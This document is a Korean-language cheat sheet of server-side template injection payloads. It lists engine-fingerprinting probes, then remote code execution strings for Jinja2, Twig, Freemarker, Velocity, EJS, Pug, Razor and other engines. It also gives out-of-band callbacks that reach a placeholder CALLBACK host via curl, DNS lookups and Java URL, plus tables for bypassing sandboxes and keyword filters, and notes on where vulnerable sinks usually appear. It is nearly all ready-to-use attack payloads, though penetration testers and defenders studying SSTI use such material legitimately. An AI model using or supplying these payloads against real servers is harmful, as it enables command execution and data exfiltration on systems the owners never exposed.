### 기본 페이로드

#### 엔진 식별 (수학 연산)

| 페이로드 | 결과 | 엔진 |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Nunjucks / Handlebars |
| `{{7*'7'}}` | `7777777` | Jinja2 (string 반복) |
| `{{7*'7'}}` | `49` | Twig |
| `${7*7}` | `49` | Mako / Thymeleaf / Freemarker / Velocity / Pebble |
| `<%= 7*7 %>` | `49` | EJS / ERB |
| `#{7*7}` | `49` | Pug / Slim |
| `${{7*7}}` | `49` | Thymeleaf SpringEL |
| `*{7*7}` | `49` | Thymeleaf 선택 식 |
| `[[${7*7}]]` | `49` | Thymeleaf inline |
| `{php}echo 7*7;{/php}` | `49` | Smarty |
| `@(7*7)` | `49` | Razor (.NET) |

#### 엔진별 RCE

| 엔진 | 페이로드 |
|---|---|
| Jinja2 | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| Jinja2 (sandbox) | `{{cycler.__init__.__globals__.os.popen('id').read()}}`, `{{lipsum.__globals__['os'].popen('id').read()}}`, `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig (1.x/2.x) | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` |
| Twig (3.x) | `{{['id']\|filter('system')}}`, `{{['id']\|map('system')}}`, `{{['id']\|sort('system')}}` |
| Mako | `<%import os; x=os.popen('id').read()%>${x}` |
| Freemarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Freemarker (newer) | `${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()}` |
| Thymeleaf SpringEL | `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x` |
| Velocity 1.x | `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))$ex` |
| Velocity 2.x (제한) | custom uberspector 없으면 어려움 — `$class.forName` 시도 |
| EJS | `<%= global.process.mainModule.require('child_process').execSync('id') %>` |
| Pug | `#{global.process.mainModule.require('child_process').execSync('id')}` |
| Handlebars (커스텀 helper + eval) | `{{#with "s" as |string|}}...{{/with}}` (constructor walk) |
| Smarty (구버전) | `{php}echo \`id\`;{/php}` |
| Smarty 3+ (sandbox) | `{system('id')}`, `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME, "...", $smarty)}` |
| Pebble | `{{ 'getRuntime'.invoke('java.lang.Runtime').exec('id') }}` |
| Tornado (Python) | `{% import os %}{{os.popen('id').read()}}` |
| Razor (.NET) | `@System.Diagnostics.Process.Start("cmd","/c calc")` |
| ERB | `<%= system("id") %>`, `<%= \`id\` %>` |
| Liquid (Shopify) | sandbox 강함 — 일반적 RCE 어려움 |
| Mustache | logic-less — RCE 불가 (Handlebars 커스텀 helper만) |

#### OOB Blind
```
# DNS callback (Jinja2)
{{request.application.__globals__.__builtins__.__import__('socket').gethostbyname('CALLBACK.oast.fun')}}

# HTTP callback (Twig)
{{['curl https://CALLBACK/ssti']|filter('system')}}

# Java HTTP (Freemarker)
${"freemarker.template.utility.ObjectConstructor"?new()("java.net.URL","https://CALLBACK/ssti").openStream()}
```

#### SpringEL view name 평가 (CVE-2022-22965 계열)
```
return "redirect:" + userInput;  // userInput이 "${T(java.lang.Runtime).getRuntime().exec('id')}"
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| Jinja2 SandboxedEnvironment | `{{cycler.__init__.__globals__.os}}`, `{{lipsum.__globals__['os']}}`, 구버전 sandbox escape CVE 변형 |
| `__class__` 키워드 차단 | `{{request[request.__init__.__globals__.__builtins__.__name__]}}`, `{{(()|attr('\x5f\x5fclass\x5f\x5f'))}}`, `{{''['__cla'+'ss__']}}` |
| `.` 차단 (attribute access) | `{{request['application']}}`, `{{request|attr('application')}}` |
| `_` 차단 | `{{request|attr(['__','class__']|join)}}`, hex `\x5f` |
| Freemarker `SAFER_RESOLVER` | `?eval` built-in, ObjectWrapper 경유 |
| Twig sandbox SecurityPolicy | 허용 filter 체인으로 미허용 함수 호출 (`map`/`sort`/`filter` 인자에 callable) |
| Velocity 2.x SecureUberspector | custom uberspector 등록 시 약화 |
| 길이 제한 | `{{config}}` (8자), `${7*7}` (5자), `<%=7%>` (6자) |
| URL/HTML 인코딩 차단 | Double encoding `%257B%257B`, Unicode `\u007B`, HTML entity `&#123;` |
| `{{` `}}` 패턴 차단 | `{%print(...)% }` (Jinja2), `<% if true %>` (EJS) |
| 단일 keyword 필터 (`os`) | `os['__class__']`, `__import__('o'+'s')`, `getattr(__builtins__, 'o'+'s')` |
| `request` 차단 | `cycler`, `lipsum`, `config`, `joiner` 같은 다른 globals 객체 |

#### Jinja2 sandbox bypass (대표 변형)
```
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

---

### 참고사항

- 빈출 sink: "이메일 템플릿 미리보기", "동적 보고서 템플릿", "위젯/숏코드", "마케팅 페이지 빌더", 관리자 권한이라도 후보 유지
- Spring `return "redirect:" + userInput` 같은 view name 평가가 SpringEL SSTI로 빈출 (CVE-2022-22965)
- Flask `render_template_string` 호출이 보이면 거의 확정 — f-string과 결합 시 즉시 위험
- Mustache 자체는 logic-less라 안전 — Handlebars 커스텀 helper에 `eval` 들어가면 위험
- Velocity는 reflection 가능 시 즉시 RCE — `$class.forName` 패턴
- 수학 결과(`49`)가 안 나와도 에러 트레이스에 엔진 명칭 노출되면 후보 유지
- `.format()` (Python)도 attribute walk 가능 — 제한적 SSTI/정보 노출
- i18n 라이브러리(i18next, ICU MessageFormat)의 동적 키 평가에 사용자 입력 시 우회 게이트
- Jinja2 sandbox는 버전별로 escape 가능한 globals 다름 — `cycler`/`lipsum`/`joiner` 모두 시도
- Freemarker의 `?eval` built-in은 동적 평가 — 차단되어도 ObjectConstructor로 우회
- Twig의 filter 체인은 callable을 두 번째 인자로 받는 함수 (map/sort/filter)에서 RCE 게이트
- Pebble (Java)은 Spring Boot 환경 자주 — sandbox 기본 없음
- Razor (.NET)은 동적 view 컴파일 시 위험 — `RazorEngine.Compile(userInput)`
- 길이 제한 환경에선 짧은 페이로드 (`{{config}}`, `${7*7}`) 우선 시도
- OOB Blind는 sandbox 환경에서도 동작 가능 — 외부 콜백 인프라 필수
